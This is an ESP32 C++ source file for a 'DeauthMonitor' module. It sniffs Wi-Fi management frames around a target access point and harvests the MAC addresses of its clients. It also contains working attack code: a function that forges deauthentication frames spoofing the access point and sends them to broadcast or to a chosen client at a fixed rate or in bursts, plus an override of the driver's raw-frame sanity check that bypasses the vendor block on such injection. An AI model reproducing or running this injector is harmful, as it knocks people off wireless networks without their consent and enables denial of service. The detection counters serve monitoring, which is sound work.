#include "deauth_monitor.h"

#include <WiFi.h>
#include "esp_wifi.h"

#include "../wifi_manager.h"

extern "C" {
    // Intercepts the internal driver sanity check function 
    // and forces it to return 0 (success/valid frame)
    int ieee80211_raw_frame_sanity_check(void* hw_arg, const uint8_t *frame, uint16_t len) {
        return 0; 
    }
}

namespace DeauthMonitor
{

    namespace
    {

        constexpr uint8_t MAX_CLIENTS = 8;
        constexpr uint32_t TX_INTERVAL_MS = 100; // 10 frames/s
        constexpr uint32_t ACTIVITY_MS = 700;
        constexpr uint16_t REASON_DEFAULT = 2; // previous auth no longer valid

        State currentState = State::Idle;

        char targetSsid[33];
        uint8_t targetBssid[6];
        uint8_t targetChannel = 0;

        volatile uint32_t mgmtTotal = 0;
        volatile uint32_t deauthTotal = 0;
        volatile uint32_t deauthFromAp = 0;
        volatile uint32_t deauthFromClient = 0;
        volatile uint32_t disassocTotal = 0;
        volatile uint32_t disassocFromAp = 0;
        volatile uint32_t broadcastDeauth = 0;
        volatile uint16_t lastReason = 0;
        volatile int8_t targetRssi = 0;
        volatile uint8_t actualChannel = 0;
        volatile bool channelMismatch = false;
        volatile bool hasClient = false;
        volatile uint8_t lastEvent = 0;
        volatile uint32_t lastEventAt = 0;
        uint8_t lastClient[6];
        uint8_t clients[MAX_CLIENTS][6];
        volatile uint8_t clientCount = 0;

        // demo test
        volatile uint32_t rxMgmtCount = 0;
        volatile uint32_t rxDataCount = 0;
        volatile uint32_t rxCtrlCount = 0;
        volatile uint32_t rxOtherCount = 0;

        // transmit side (main-task only)
        bool txActive = false;
        bool txBroadcast = true;
        uint16_t txReason = REASON_DEFAULT;
        uint32_t txSent = 0;
        volatile uint32_t txSelfHeard = 0;
        volatile uint16_t lastTxSeq = 0;
        volatile bool sawSelf = false;
        uint32_t lastTxAt = 0;

        bool macEqual(const uint8_t *a, const uint8_t *b)
        {
            for (uint8_t i = 0; i < 6; ++i)
                if (a[i] != b[i])
                    return false;
            return true;
        }

        bool macBroadcast(const uint8_t *a)
        {
            for (uint8_t i = 0; i < 6; ++i)
                if (a[i] != 0xFF)
                    return false;
            return true;
        }

        void noteClient(const uint8_t *mac)
        {
            if (mac[0] & 0x01)
                return; // multicast
            if (macEqual(mac, targetBssid))
                return;

            const uint8_t known = clientCount;
            for (uint8_t i = 0; i < known; ++i)
                if (macEqual(clients[i], mac))
                    return;

            if (known < MAX_CLIENTS)
            {
                for (uint8_t i = 0; i < 6; ++i)
                    clients[known][i] = mac[i];
                clientCount = known + 1;
            }
        }

        // Wi-Fi task context: no Serial, no String, no allocation.
        void promiscuousCallback(void *buffer, wifi_promiscuous_pkt_type_t type)
        {
            static uint32_t callbackCount = 0;
            ++callbackCount;

            if (callbackCount == 1 || callbackCount % 500 == 0)
            {
                Serial.printf("Promiscuous callbacks: %lu\n",
                              (unsigned long)callbackCount);
            }

            switch (type)
            {
            case WIFI_PKT_MGMT:
                rxMgmtCount++;
                break;

            case WIFI_PKT_DATA:
                rxDataCount++;
                break;

            case WIFI_PKT_CTRL:
                rxCtrlCount++;
                break;

            default:
                rxOtherCount++;
                break;
            }

            const wifi_promiscuous_pkt_t *packet =
                static_cast<const wifi_promiscuous_pkt_t *>(buffer);

            const uint16_t reported = packet->rx_ctrl.sig_len;
            if (reported < 4)
                return;

            const uint16_t length = reported - 4; // sig_len includes the FCS
            if (length < 24)
                return;

            const uint8_t *frame = packet->payload;
            const uint8_t *destination = frame + 4;
            const uint8_t *transmitter = frame + 10;
            const uint8_t *bssid = frame + 16;

            if (type == WIFI_PKT_DATA)
            { // harvest client MACs
                if (!macEqual(bssid, targetBssid))
                    return;
                if (!macEqual(transmitter, targetBssid))
                    noteClient(transmitter);
                else if (!macEqual(destination, targetBssid))
                    noteClient(destination);
                return;
            }

            if (type != WIFI_PKT_MGMT)
                return;

            const uint8_t frameControl = frame[0];
            if (frameControl & 0x0C)
                return;

            mgmtTotal++;

            const uint8_t subtype = (frameControl >> 4) & 0x0F;

            if (subtype == 0x08)
            { // beacon: live RSSI
                if (macEqual(bssid, targetBssid))
                    targetRssi = packet->rx_ctrl.rssi;
                return;
            }

            const bool isDeauth = (subtype == 0x0C);
            const bool isDisassoc = (subtype == 0x0A);
            if (!isDeauth && !isDisassoc)
                return;
            if (!macEqual(bssid, targetBssid))
                return;

            const bool fromAp = macEqual(transmitter, targetBssid);

            // Our own injected frames come back on the air. Match them by the
            // sequence number we assigned so they don't inflate the AP counters.
            if (isDeauth && txActive && fromAp)
            {
                const uint16_t rxSeq =
                    static_cast<uint16_t>(frame[22] | (frame[23] << 8)) >> 4;
                if (rxSeq == lastTxSeq && sawSelf)
                {
                    txSelfHeard++;
                    lastEventAt = millis();
                    return;
                }
            }

            if (isDeauth)
            {
                deauthTotal++;
                lastEvent = fromAp
                                ? (macBroadcast(destination)
                                       ? static_cast<uint8_t>(Event::DeauthBroadcast)
                                       : static_cast<uint8_t>(Event::DeauthFromAp))
                                : static_cast<uint8_t>(Event::DeauthFromClient);
                lastEventAt = millis();

                if (fromAp)
                {
                    deauthFromAp++;
                    if (macBroadcast(destination))
                        broadcastDeauth++;
                }
                else
                {
                    deauthFromClient++;
                }
            }
            else
            {
                disassocTotal++;
                lastEvent = static_cast<uint8_t>(Event::DisassocFromAp);
                lastEventAt = millis();
                if (fromAp)
                    disassocFromAp++;
            }

            if (length >= 26)
            {
                lastReason = static_cast<uint16_t>(frame[24]) |
                             (static_cast<uint16_t>(frame[25]) << 8);
            }

            if (isDeauth && fromAp && !macBroadcast(destination))
            {
                for (uint8_t i = 0; i < 6; ++i)
                    lastClient[i] = destination[i];
                hasClient = true;
                noteClient(destination);
            }
        }

        void sendDeauthFrame()
        {
            uint8_t frame[26] __attribute__((aligned(4)));

            frame[0] = 0xC0; // mgmt, subtype 12 = deauth
            frame[1] = 0x00;
            frame[2] = 0x00; // duration
            frame[3] = 0x00;

            const uint8_t *dest =
                (!txBroadcast && clientCount > 0) ? clients[0] : nullptr;

            for (uint8_t i = 0; i < 6; ++i)
                frame[4 + i] = dest ? dest[i] : 0xFF;
            for (uint8_t i = 0; i < 6; ++i)
                frame[10 + i] = targetBssid[i]; // addr2 = AP
            for (uint8_t i = 0; i < 6; ++i)
                frame[16 + i] = targetBssid[i]; // addr3 = BSSID

            const uint16_t seq = (lastTxSeq + 1) & 0x0FFF;
            lastTxSeq = seq;
            sawSelf = true;
            frame[22] = static_cast<uint8_t>((seq & 0x0F) << 4);
            frame[23] = static_cast<uint8_t>((seq >> 4) & 0xFF);

            frame[24] = static_cast<uint8_t>(txReason & 0xFF);
            frame[25] = static_cast<uint8_t>(txReason >> 8);

            if (esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false) == ESP_OK)
                txSent++;
        }

    } // namespace

    bool start(const char *ssid, const uint8_t *bssid, uint8_t channel, int8_t rssi)
    {
        targetSsid[0] = '\0';
        if (ssid)
        {
            strncpy(targetSsid, ssid, 32);
            targetSsid[32] = '\0';
        }
        for (uint8_t i = 0; i < 6; ++i)
            targetBssid[i] = bssid[i];
        targetChannel = channel;

        WiFi.setAutoReconnect(false);
        WifiManager::disconnect();

        // Modem sleep drops frames and wrecks injection timing.
        WiFi.setSleep(false);

        esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);

        uint8_t primary = 0;
        wifi_second_chan_t second = WIFI_SECOND_CHAN_NONE;
        esp_wifi_get_channel(&primary, &second);
        actualChannel = primary;
        channelMismatch = (primary != targetChannel);

        wifi_promiscuous_filter_t filter;
        filter.filter_mask =
            WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
        if (esp_wifi_set_promiscuous_filter(&filter) != ESP_OK)
        {
            currentState = State::Unsupported;
            return false;
        }

        if (esp_wifi_set_promiscuous_rx_cb(&promiscuousCallback) != ESP_OK)
        {
            currentState = State::Unsupported;
            return false;
        }

        mgmtTotal = 0;
        deauthTotal = 0;
        deauthFromAp = 0;
        deauthFromClient = 0;
        disassocTotal = 0;
        disassocFromAp = 0;
        broadcastDeauth = 0;
        lastReason = 0;
        clientCount = 0;
        hasClient = false;
        lastEvent = 0;
        lastEventAt = 0;
        targetRssi = rssi;
        txActive = false;
        txBroadcast = true;
        txReason = REASON_DEFAULT;
        txSent = 0;
        txSelfHeard = 0;
        sawSelf = false;

        if (esp_wifi_set_promiscuous(true) != ESP_OK)
        {
            currentState = State::Unsupported;
            return false;
        }

        currentState = State::Monitoring;
        rxMgmtCount = 0;
        rxDataCount = 0;
        rxCtrlCount = 0;
        rxOtherCount = 0;
        return true;
    }
    void printRxDiagnostics()
    {
        Serial.printf(
            "[RX] mgmt=%lu data=%lu ctrl=%lu other=%lu\n",
            (unsigned long)rxMgmtCount,
            (unsigned long)rxDataCount,
            (unsigned long)rxCtrlCount,
            (unsigned long)rxOtherCount);
    }

    bool runTxDiagnostic()
{
    wifi_mode_t mode;
    esp_err_t err = esp_wifi_get_mode(&mode);

    Serial.printf("[TX-TEST] get_mode: %s\n", esp_err_to_name(err));

    if (err != ESP_OK) {
        return false;
    }

    Serial.printf("[TX-TEST] Wi-Fi mode: %d\n", (int)mode);

    uint8_t primary = 0;
    wifi_second_chan_t secondary = WIFI_SECOND_CHAN_NONE;

    err = esp_wifi_get_channel(&primary, &secondary);

    Serial.printf("[TX-TEST] get_channel: %s\n", esp_err_to_name(err));

    if (err != ESP_OK) {
        return false;
    }

    Serial.printf("[TX-TEST] Current channel: %u\n", primary);

    wifi_mode_t currentMode;
    err = esp_wifi_get_mode(&currentMode);

    Serial.printf("[TX-TEST] Driver query: %s\n", esp_err_to_name(err));

    return err == ESP_OK;
}

void stop()
    {
        txActive = false;

        // 1. Explicitly turn off promiscuous mode and clear callbacks first
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(nullptr);

        // 2. Clear the promiscuous filter mask so the driver isn't left filtering packets
        wifi_promiscuous_filter_t filter = {0};
        esp_wifi_set_promiscuous_filter(&filter);

        currentState = State::Idle;

        // 3. Reset power saving and auto-reconnect modes gently
        WiFi.setSleep(false); // Keep sleep disabled so scanner/radio is responsive
        WiFi.setAutoReconnect(false);

        // 4. Force mode back to STA and ensure it's fully awake for the next scan
        WiFi.mode(WIFI_STA);

        // Optional: If WifiManager is enabled, let it stay idle rather than 
        // forcing an immediate background reconnect that blocks the scanner.
        if (WifiManager::isEnabled())
        {
            // Do not call WiFi.reconnect() immediately here so scanning works right away.
        }
    }

    void updateTransmit()
    {
        if (!txActive)
            return;

        const uint32_t now = millis();
        if ((uint32_t)(now - lastTxAt) < TX_INTERVAL_MS)
            return;
        lastTxAt = now;
        sendDeauthFrame();
    }

    void setTransmit(bool enabled)
    {
        txActive = enabled;
        lastTxAt = millis() - TX_INTERVAL_MS; // fire immediately
    }

    bool transmitting() { return txActive; }
    void burst(uint8_t frames)
    {
        for (uint8_t i = 0; i < frames; ++i)
            sendDeauthFrame();
    }
    void setReason(uint16_t r) { txReason = r; }
    void setBroadcast(bool b) { txBroadcast = b; }
    bool broadcast() { return txBroadcast; }

    State state() { return currentState; }

    Counters counters()
    {
        Counters c;
        c.mgmtTotal = mgmtTotal;
        c.deauthTotal = deauthTotal;
        c.deauthFromAp = deauthFromAp;
        c.deauthFromClient = deauthFromClient;
        c.disassocTotal = disassocTotal;
        c.disassocFromAp = disassocFromAp;
        c.broadcastDeauth = broadcastDeauth;
        c.distinctClients = clientCount;
        c.lastReason = lastReason;
        c.targetRssi = targetRssi;
        c.targetChannel = targetChannel;
        c.actualChannel = actualChannel;
        c.channelMismatch = channelMismatch;
        c.hasClient = hasClient;
        for (uint8_t i = 0; i < 6; ++i)
            c.lastClient[i] = lastClient[i];

        const uint32_t age = lastEventAt ? (uint32_t)(millis() - lastEventAt) : 0;
        c.lastEvent = static_cast<Event>(lastEvent);
        c.sinceLastEventMs = age;
        c.activity = (lastEventAt != 0) && (age < ACTIVITY_MS);

        c.txActive = txActive;
        c.txBroadcast = txBroadcast;
        c.txReason = txReason;
        c.txSent = txSent;
        c.txSelfHeard = txSelfHeard;
        return c;
    }

} // namespace DeauthMonitor